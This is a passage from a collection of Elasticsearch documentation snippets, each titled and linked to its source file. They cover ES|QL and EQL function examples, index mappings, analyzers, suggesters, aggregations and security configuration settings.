enabled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_14\n\nLANGUAGE: text\nCODE:\n```\n#|abc  # matches 'abc' but nothing else, not even an empty string\n```\n\n----------------------------------------\n\nTITLE: Defining Duration Class\nDESCRIPTION: This code snippet defines the `java.time.Duration` class and lists its methods and fields, covering operations like calculating durations, performing arithmetic operations, and converting to different units. It includes static constants like `ZERO` and methods for parsing and formatting durations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\n\"class java.time.Duration {\\n  Duration ZERO\\n  Duration abs()\\n  Duration between(Temporal,Temporal)\\n  int compareTo(Duration)\\n  Duration dividedBy(long)\\n  Duration from(TemporalAmount)\\n  int getNano()\\n  long getSeconds()\\n  boolean isNegative()\\n  boolean isZero()\\n  Duration minus(Duration)\\n  Duration minus(long,TemporalUnit)\\n  Duration minusDays(long)\\n  Duration minusHours(long)\\n  Duration minusMinutes(long)\\n  Duration minusSeconds(long)\\n  Duration minusMillis(long)\\n  Duration minusNanos(long)\\n  Duration multipliedBy(long)\\n  Duration negated()\\n  Duration of(long,TemporalUnit)\\n  Duration ofDays(long)\\n  Duration ofHours(long)\\n  Duration ofMillis(long)\\n  Duration ofMinutes(long)\\n  Duration ofNanos(long)\\n  Duration ofSeconds(long)\\n  Duration ofSeconds(long,long)\\n  Duration parse(CharSequence)\\n  Duration plus(Duration)\\n  Duration plus(long,TemporalUnit)\\n  Duration plusDays(long)\\n  Duration plusHours(long)\\n  Duration plusMinutes(long)\\n  Duration plusSeconds(long)\\n  Duration plusMillis(long)\\n  Duration plusNanos(long)\\n  long toDays()\\n  long toHours()\\n  long toMinutes()\\n  long toMillis()\\n  long toNanos()\\n  Duration withSeconds(long)\\n  Duration withNanos(int)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Anonymous Access in Elasticsearch YAML\nDESCRIPTION: These YAML settings control anonymous access to Elasticsearch, including the username, roles, and authorization behavior for anonymous users.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.authc.anonymous.username: _es_anonymous_user\nxpack.security.authc.anonymous.roles: [role1, role2]\nxpack.security.authc.anonymous.authz_exception: true\n```\n\n----------------------------------------\n\nTITLE: Interactive Program License Notice\nDESCRIPTION: Example of a short license notice to be displayed when an interactive program starts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-langdetect-NOTICE.txt#2025-04-22_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author\nGnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n`show w'. This is free software, and you are welcome to redistribute\nit under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Logging put_role Event in Elasticsearch\nDESCRIPTION: Example of an audit log for the create or update role event. This event is logged when the API is invoked to create or update a role in the security system.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-30T22:27:01,978+0200\", \"node.id\":\n\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"security_config_change\",\n\"event.action\":\"put_role\", \"request.id\":\"tDYQhv5CRMWM4Sc5Zkk2cQ\",\n\"put\":{\"role\":{\"name\":\"test_role\",\"role_descriptor\":{\"cluster\":[\"all\"],\n\"indices\":[{\"names\":[\"apm*\"],\"privileges\":[\"all\"],\"field_security\":\n{\"grant\":[\"granted\"]},\"query\":\"{\\\"term\\\": {\\\"service.name\\\": \\\"bar\\\"}}\"},\n{\"names\":[\"apm-all*\"],\"privileges\":[\"all\"],\"query\":\"{\\\"term\\\":\n{\\\"service.name\\\": \\\"bar2\\\"}}\"}\"],\"applications\":[],\"run_as\":[]}}}}\n```\n\n----------------------------------------\n\nTITLE: Documenting String Parameter for ESQL Function in Markdown\nDESCRIPTION: This snippet describes the parameter for an ESQL function. It specifies that the function takes a string expression as input and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/bit_length.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`string`\n:   String expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Grouping, Aggregation, and Sorting with ESQL\nDESCRIPTION: This ESQL query creates a row with an integer and an array, performs a MIN aggregation grouped by array elements, and sorts the result. It demonstrates the use of ROW, STATS, and SORT clauses in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/stats.csv-spec/mv-group.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW i=1, a=[\"a\", \"b\"] | STATS MIN(i) BY a | SORT a ASC\n```\n\n----------------------------------------\n\nTITLE: Converting String to Base64 Using TO_BASE64 Function in ESQL\nDESCRIPTION: This example demonstrates how to use the TO_BASE64 function to encode a string value in ESQL. It creates a row with a field 'a' containing the string 'elastic', then evaluates a new field 'e' that contains the base64-encoded value of field 'a'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_base64.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"elastic\"\n| EVAL e = TO_BASE64(a)\n```\n\n----------------------------------------\n\nTITLE: Example Warning Log Message\nDESCRIPTION: This warning message indicates that the `/ping` endpoint of the data extraction service returned a non-`200` response. The extraction service may be unhealthy, require restarting, or the configured `extraction_service.host` may be incorrect. Check extraction service logs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\nData extraction service found at <HOST>, but health-check returned <RESPONSE STATUS>.\n```\n\n----------------------------------------\n\nTITLE: Date Histogram Aggregation with 50-Day Offset\nDESCRIPTION: Example response showing date histogram buckets with a 50-day offset, showing how documents can be grouped into the same bucket.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\n\"buckets\": [\n  { \"key_as_string\": \"2022-01-20\", \"key\": 1642636800000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-02-20\", \"key\": 1645315200000, \"doc_count\": 2 },\n  { \"key_as_string\": \"2022-04-20\", \"key\": 1650412800000, \"doc_count\": 2 },\n  { \"key_as_string\": \"2022-06-20\", \"key\": 1655683200000, \"doc_count\": 2 },\n  { \"key_as_string\": \"2022-08-20\", \"key\": 1660953600000, \"doc_count\": 1 }\n]\n```\n\n----------------------------------------\n\nTITLE: Modulo Operation Examples in EQL\nDESCRIPTION: Examples of using the modulo function to calculate remainders with various numeric inputs, including handling of null values and process variables.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_8\n\nLANGUAGE: eql\nCODE:\n```\nmodulo(10, 6)                                       // returns 4\nmodulo(10, 5)                                       // returns 0\nmodulo(10, 0.5)                                     // returns 0\nmodulo(10, -6)                                      // returns 4\nmodulo(-10, -6)                                     // returns -4\n\n// process.args_count = 10\nmodulo(process.args_count, 6)                       // returns 4\nmodulo(process.args_count, 5)                       // returns 0\nmodulo(106, process.args_count)                     // returns 6\nmodulo(process.args_count, -6)                      // returns 4\nmodulo(process.args_count, 0.5)                     // returns 0\n\n// process.parent.args_count = 6\nmodulo(process.args_count, process.parent.args_count)  // returns 4\n\n// null handling\nmodulo(null, 5)                                     // returns null\nmodulo(7, null)                                     // returns null\nmodulo(null, process.args_count)                    // returns null\nmodulo(process.args_count, null)                    // returns null\n```\n\n----------------------------------------\n\nTITLE: Configuring Analyzers with Synonym Graph Token Filters in JSON\nDESCRIPTION: Shows how to include the synonym graph token filter within a custom analyzer setup in Elasticsearch, enhancing text analysis by applying stemming and synonym expansion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-graph-tokenfilter.md#2025-04-21_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"analyzer\": {\n    \"my_analyzer\": {\n      \"type\": \"custom\",\n      \"tokenizer\": \"standard\",\n      \"filter\": [\"stemmer\", \"synonym_graph\"]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Document with Synthetic Source Keep Example in Elasticsearch\nDESCRIPTION: This snippet shows how to index a document in an Elasticsearch index configured with synthetic source keep settings. It demonstrates the preservation of array ordering and structure in the _source field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-source-field.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT idx_keep/_doc/1\n{\n  \"path\": {\n    \"to\": [\n      { \"foo\": [3, 2, 1] },\n      { \"foo\": [30, 20, 10] }\n    ],\n    \"bar\": \"baz\"\n  },\n  \"ids\": [ 200, 100, 300, 100 ]\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"path\": {\n    \"to\": [\n      { \"foo\": [3, 2, 1] },\n      { \"foo\": [30, 20, 10] }\n    ],\n    \"bar\": \"baz\"\n  },\n  \"ids\": [ 200, 100, 300, 100 ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Join Field Mapping in Elasticsearch Index\nDESCRIPTION: Demonstrates how to set up an index with a join field mapping that defines parent-child relationships between documents\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-has-parent-query.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT /my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my-join-field\": {\n        \"type\": \"join\",\n        \"relations\": {\n          \"parent\": \"child\"\n        }\n      },\n      \"tag\": {\n        \"type\": \"keyword\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example Response from Change Point Aggregation\nDESCRIPTION: Shows the response structure from a change point aggregation query, including the identified change point bucket, document count, aggregated values, and change type details with statistical significance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-change-point-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"change_points_avg\": {\n      \"bucket\": {\n        \"key\": \"2023-04-29T00:00:00.000Z\",\n        \"doc_count\": 329,\n        \"avg\": {\n          \"value\": 4737.209726443769\n        }\n      },\n      \"type\": {\n        \"dip\": {\n          \"p_value\": 3.8999455212466465e-10,\n          \"change_point\": 41\n        }\n      }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using FLOOR Function in ESQL to Round Down Values\nDESCRIPTION: Example showing how to use the FLOOR function to round down a decimal value to the nearest integer. The function takes a numeric input and returns the largest integer less than or equal to the input value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/floor.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL a=FLOOR(a)\n```\n\n----------------------------------------\n\nTITLE: Using Weight Function in Elasticsearch Query\nDESCRIPTION: This snippet illustrates how to apply a weight to score functions in a function_score query, effectively allowing for the multiplication of scores with a specific float value, providing more control over the score normalization process.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-function-score-query.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n\"weight\" : number\n```\n\n----------------------------------------\n\nTITLE: Using CASE Function in ESQL Query\nDESCRIPTION: Example demonstrating how to use the CASE function to categorize employees based on the number of languages they speak. The function evaluates conditions in order and returns the value corresponding to the first true condition. If no conditions match and no default is provided, returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/case.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| EVAL type = CASE(\n    languages <= 1, \"monolingual\",\n    languages <= 2, \"bilingual\",\n     \"polyglot\")\n| KEEP emp_no, languages, type\n```\n\n----------------------------------------\n\nTITLE: Using Global Suggest Text\nDESCRIPTION: Example of using a global suggest text to avoid repetition across multiple suggestions. The text is defined once at the suggest level and applies to all suggestions in the request.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST _search\n{\n  \"suggest\": {\n    \"text\" : \"tring out Elasticsearch\",\n    \"my-suggest-1\" : {\n      \"term\" : {\n        \"field\" : \"message\"\n      }\n    },\n    \"my-suggest-2\" : {\n       \"term\" : {\n        \"field\" : \"user\"\n       }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Geographic Data with ST_WITHIN in ESQL\nDESCRIPTION: This query selects airports whose city boundaries fall within a specified polygon area. It uses the ST_WITHIN function to perform the geospatial containment test and keeps only relevant columns in the output. The example returns information about Sanya Phoenix International Airport which is located within the specified coordinates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_within.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE ST_WITHIN(city_boundary, TO_GEOSHAPE(\"POLYGON((109.1 18.15, 109.6 18.15, 109.6 18.65, 109.1 18.65, 109.1 18.15))\"))\n| KEEP abbrev, airport, region, city, city_location\n```\n\n----------------------------------------\n\nTITLE: Case-Insensitive Process Name Contains Check - Elasticsearch\nDESCRIPTION: This query identifies `process` events where the `process_name` contains 'foo', doing so without regard to case by setting the `case_insensitive` flag true in a `wildcard` query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_8\n\nLANGUAGE: Elasticsearch\nCODE:\n```\n{\"bool\":{\"must\":[{\"term\":{\"event.category\":{\"value\":\"process\"}}},{\"wildcard\":{\"process_name\":{\"wildcard\":\"*foo*\",\"case_insensitive\":true,\"boost\":1.0}}}],\"boost\":1.0}}\n```\n\n----------------------------------------\n\nTITLE: Viewing Token Attributes with Nori Tokenizer\nDESCRIPTION: Request to analyze Korean text using the Nori tokenizer with additional attributes displayed, showing how to examine POS tags and other linguistic information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-tokenizer.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"nori_tokenizer\",\n  \"text\": \"뿌리가 깊은 나무는\",   <1>\n  \"attributes\" : [\"posType\", \"leftPOS\", \"rightPOS\", \"morphemes\", \"reading\"],\n  \"explain\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Keystore for SSL (Bash)\nDESCRIPTION: Command to add the keystore password as a secure configuration setting in Elasticsearch. This allows Elasticsearch to access the private key for SSL encryption.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/cli/src/main/resources/org/elasticsearch/xpack/security/cli/certutil-http/es-readme-p12.txt#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nelasticsearch-keystore add \"xpack.security.http.ssl.keystore.secure_password\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Pattern Analyzer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure the `pattern` analyzer in Elasticsearch to split email addresses based on non-word characters or underscores (`\\W|_`) and convert the results to lowercase. It includes creating an index with custom analyzer settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-analyzer.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_email_analyzer\": {\n          \"type\":      \"pattern\",\n          \"pattern\":   \"\\\\W|_\", <1>\n          \"lowercase\": true\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_email_analyzer\",\n  \"text\": \"John_Smith@foo-bar.com\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an int8 Quantized Dense Vector Index\nDESCRIPTION: This snippet shows how to create a byte-quantized dense vector index using int8_hnsw indexing. This reduces memory footprint by 75% at the cost of some accuracy.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nPUT my-byte-quantized-index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_vector\": {\n        \"type\": \"dense_vector\",\n        \"dims\": 3,\n        \"index\": true,\n        \"index_options\": {\n          \"type\": \"int8_hnsw\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Average Languages using ESQL Stats\nDESCRIPTION: ESQL query that computes the average number of languages from the employees table using the STATS and AVG functions. The query outputs a single column named avg_lang containing the calculated mean value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/stats.csv-spec/statsWithoutBy.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS avg_lang = AVG(languages)\n```\n\n----------------------------------------\n\nTITLE: Calculating Square Root with Fractional Exponent in ESQL\nDESCRIPTION: This snippet shows how to use the POW function with a fractional exponent to calculate a root. It uses a base of 4 and an exponent of 0.5 to calculate the square root of 4.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/pow.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW base = 4, exponent = 0.5\n| EVAL s = POW(base, exponent)\n```\n\n----------------------------------------\n\nTITLE: Disabling Indexing for Dense Vector Field\nDESCRIPTION: This snippet demonstrates how to disable indexing for a dense vector field by setting the index parameter to false. This reduces ingestion time but prevents efficient kNN searches.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nPUT my-index-2\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_vector\": {\n        \"type\": \"dense_vector\",\n        \"dims\": 3,\n        \"index\": false\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring HDFS Repository via Elasticsearch REST API\nDESCRIPTION: This snippet demonstrates how to create an HDFS repository using the Elasticsearch REST API. It includes essential settings like the HDFS URI, path for storing data, and an example of specifying a Hadoop configuration parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/repository-hdfs-config.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _snapshot/my_hdfs_repository\n{\n  \"type\": \"hdfs\",\n  \"settings\": {\n    \"uri\": \"hdfs://namenode:8020/\",\n    \"path\": \"elasticsearch/repositories/my_hdfs_repository\",\n    \"conf.dfs.client.read.shortcircuit\": \"true\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using PI() Function in ESQL\nDESCRIPTION: Demonstrates how to use the PI() function in ESQL to return the mathematical constant π (pi). The function takes no arguments and returns the value of π as a double precision floating point number (3.141592653589793).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/pi.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW PI()\n```\n\n----------------------------------------\n\nTITLE: Creating Token Filter Factory in Java\nDESCRIPTION: This Java class implements a factory for the custom HelloWorldTokenFilter. It uses the @NamedComponent annotation to register the filter with the name 'hello_world'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/extend/example-text-analysis-plugin.md#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npackage org.example;\n\nimport org.apache.lucene.analysis.TokenStream;\nimport org.elasticsearch.plugin.analysis.TokenFilterFactory;\nimport org.elasticsearch.plugin.NamedComponent;\n\n@NamedComponent(value = \"hello_world\")\npublic class HelloWorldTokenFilterFactory implements TokenFilterFactory {\n\n    @Override\n    public TokenStream create(TokenStream tokenStream) {\n        return new HelloWorldTokenFilter(tokenStream);\n    }\n\n}\n```\n\n----------------------------------------\n\nTITLE: EWMA Implementation in Elasticsearch\nDESCRIPTION: Exponentially weighted moving average function with configurable alpha parameter for decay control. Provides greater smoothing for small alpha values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-movfn-aggregation.md#2025-04-21_snippet_9\n\nLANGUAGE: json\nCODE:\n```\nPOST /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_date_histo\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\"\n      },\n      \"aggs\": {\n        \"the_sum\": {\n          \"sum\": { \"field\": \"price\" }\n        },\n        \"the_movavg\": {\n          \"moving_fn\": {\n            \"buckets_path\": \"the_sum\",\n            \"window\": 10,\n            \"script\": \"MovingFunctions.ewma(values, 0.3)\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Suggestions with Category Context in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to index suggestions with associated categories using the 'category' context in Elasticsearch. It shows how to include multiple input suggestions and assign them to specific categories.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_20\n\nLANGUAGE: console\nCODE:\n```\nPUT place/_doc/1\n{\n  \"suggest\": {\n    \"input\": [ \"timmy's\", \"starbucks\", \"dunkin donuts\" ],\n    \"contexts\": {\n      \"place_type\": [ \"cafe\", \"food\" ]                    <1>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: EQL Basic Process Query\nDESCRIPTION: A simple query to test unconditional processing. No specific filter is applied. Assumes the presence of generalized process data without specific criteria.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_0\n\nLANGUAGE: basic\nCODE:\n```\nprocess where true\n;\n;\n```\n\n----------------------------------------\n\nTITLE: Advanced Jira Sync Rules - Assignee and Date Filtering\nDESCRIPTION: JSON configuration to filter Jira issues based on assignee status and creation date. This example identifies unassigned issues created more than a day ago.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-jira.md#2025-04-21_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"query\": \"assignee is EMPTY and created < -1d\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Concatenating Strings with CONCAT in ESQL\nDESCRIPTION: This snippet demonstrates how to use the CONCAT function in ESQL to combine first and last names into a full name. It selects data from the 'employees' table, keeps only the first_name and last_name columns, and then creates a new 'fullname' column using CONCAT.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/concat.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name\n| EVAL fullname = CONCAT(first_name, \" \", last_name)\n```\n\n----------------------------------------\n\nTITLE: QUERY Function Syntax in Elasticsearch SQL\nDESCRIPTION: The QUERY function exposes query_string capabilities in Elasticsearch SQL, accepting query text and optional parameters to control search behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-search.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nQUERY(\n    constant_exp <1>\n    [, options]) <2>\n```\n\n----------------------------------------\n\nTITLE: Executing geohex_grid aggregation in Elasticsearch\nDESCRIPTION: Illustrates the geohex_grid aggregation in Elasticsearch to group documents by geohex values. The GET query specifies location field with a precision parameter for the aggregation. The results highlight the document count within each geohex grid bucket.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-grid-query.md#2025-04-21_snippet_5\n\nLANGUAGE: Elasticsearch\nCODE:\n```\nGET /my_locations/_search\n{\n  \"size\" : 0,\n  \"aggs\" : {\n     \"grouped\" : {\n        \"geohex_grid\" : {\n           \"field\" : \"location\",\n           \"precision\" : 1\n        }\n     }\n  }\n}\n```\n\nLANGUAGE: Elasticsearch\nCODE:\n```\n{\n  \"took\" : 2,\n  \"timed_out\" : false,\n  \"_shards\" : {\n    \"total\" : 1,\n    \"successful\" : 1,\n    \"skipped\" : 0,\n    \"failed\" : 0\n  },\n  \"hits\" : {\n    \"total\" : {\n      \"value\" : 3,\n      \"relation\" : \"eq\"\n    },\n    \"max_score\" : null,\n    \"hits\" : [ ]\n  },\n  \"aggregations\" : {\n    \"grouped\" : {\n      \"buckets\" : [\n        {\n          \"key\" : \"81197ffffffffff\",\n          \"doc_count\" : 2\n        },\n        {\n          \"key\" : \"811fbffffffffff\",\n          \"doc_count\" : 1\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using LOCATE Function in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the LOCATE function in ESQL. It finds the position of the substring 'll' within the string 'hello'. The function returns an integer indicating the position, with string positions starting from 1. If the substring is not found, it returns 0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/locate.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"hello\"\n| EVAL a_ll = LOCATE(a, \"ll\")\n```\n\n----------------------------------------\n\nTITLE: Synthetic Source Geopoint Example\nDESCRIPTION: Demonstration of synthetic source functionality with geo_point fields, showing how values are sorted and reduced to stored precision.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-point.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"point\": { \"type\": \"geo_point\" }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"point\": [\n    {\"lat\":-90, \"lon\":-80},\n    {\"lat\":10, \"lon\":30}\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Sorting with Mode Option for Array Fields in Elasticsearch\nDESCRIPTION: Illustrates how to use the 'mode' option when sorting on array fields, using the average value of a price field for sorting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001/_doc/1?refresh\n{\n   \"product\": \"chocolate\",\n   \"price\": [20, 4]\n}\n\nPOST /_search\n{\n   \"query\" : {\n      \"term\" : { \"product\" : \"chocolate\" }\n   },\n   \"sort\" : [\n      {\"price\" : {\"order\" : \"asc\", \"mode\" : \"avg\"}}\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Pattern Replace Filter in Elasticsearch\nDESCRIPTION: This example uses the analyze API with a pattern_replace filter to prepend 'watch' to the substring 'dog' in the text 'foxes jump lazy dogs', resulting in the token 'watchdogs'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern_replace-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    {\n      \"type\": \"pattern_replace\",\n      \"pattern\": \"(dog)\",\n      \"replacement\": \"watch$1\"\n    }\n  ],\n  \"text\": \"foxes jump lazy dogs\"\n}\n```\n\n----------------------------------------\n\nTITLE: Filtered Completion Suggester Response in Elasticsearch\nDESCRIPTION: Shows the response from a completion suggester with source filtering applied, returning only the 'suggest' field in the source documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_15\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 6,\n  \"timed_out\": false,\n  \"_shards\": {\n    \"total\": 1,\n    \"successful\": 1,\n    \"skipped\": 0,\n    \"failed\": 0\n  },\n  \"hits\": {\n    \"total\": {\n      \"value\": 0,\n      \"relation\": \"eq\"\n    },\n    \"max_score\": null,\n    \"hits\": []\n  },\n  \"suggest\": {\n    \"song-suggest\": [ {\n        \"text\": \"nir\",\n        \"offset\": 0,\n        \"length\": 3,\n        \"options\": [ {\n            \"text\": \"Nirvana\",\n            \"_index\": \"music\",\n            \"_id\": \"1\",\n            \"_score\": 1.0,\n            \"_source\": {\n              \"suggest\": [ \"Nevermind\", \"Nirvana\" ]\n            }\n          } ]\n      } ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Docker Image for Connector Service\nDESCRIPTION: Shell command to run the Docker image for the connector service. This command includes mounting the configuration directory and specifying the Docker network.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mysql.md#2025-04-21_snippet_5\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" 